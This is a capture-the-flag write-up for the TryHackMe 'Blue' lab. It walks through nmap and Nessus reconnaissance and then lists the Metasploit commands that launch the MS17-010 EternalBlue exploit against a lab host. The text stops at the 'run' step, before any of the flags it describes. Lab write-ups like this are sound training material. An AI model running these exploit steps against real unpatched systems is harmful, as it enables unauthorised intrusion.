## TryHackMe - (Eternal)Blue Methodology

This is the attack methodology I used for TryHackMe's Blue box.
This box is a step back from Blueprint in terms of objective progression, however I found it to be a good lesson in fundementals.
I will mainly be focusing on the flags.

### Environment
#### Operating System
Latest kali-VM rolling update
#### Tools
Nessus
Metasploit

### Methodology
#### Objectives/Flags
 Flag1, This flag can be found at the system root.
 Flag2, This flag canbe found at the location where passwords are stored within Windows.
 Flag3, this flag can be found in an excellent location to loot.
#### Reconnaissance
First I started by running an nmap scan on the target. It was disclosed that ICMP was not going to work so I added in the extra ```-Pn``` into the options.
```
nmap -T4 -Pn <TargetIP>
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3389/tcp  open  ms-wbt-server
	49152/tcp open  unknown
	49153/tcp open  unknown
	49154/tcp open  unknown
	49158/tcp open  unknown
```
With this portscan I can see that there are a number of Windows services running on open ports. I figured this was a great time to employ a vulnerability scanner to see what more I could find.
I decided to try Nessus which is a well known vuln. scanner. Once downloading the installation file to my machine and registering for a license...
```
sudo apt install -f ./<Nessus.deb>
  service nessusd start
     https://kali:8834/
```
Once Nessus was up and running I set the Target and set it loose. A number of vulnerabilities were flagged and one stood out the most which I took to be relevant to the box.
```
port445 	MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)
```
The box walkthrough mentioned that it was time to use Metasploit which I've never used before. This required a bit of crash-coursing on google to understand the basic usage and comands.

```
metasploit
  search ms17-010
    exploit/windows/smb/ms17_010_eternalblue
		  use [0] (exploit/windows/smb/ms17_010_eternalblue)
		  set rhost 10.10.97.121
		  set lhost 10.4.63.148
		  set lport 445
		  run
```
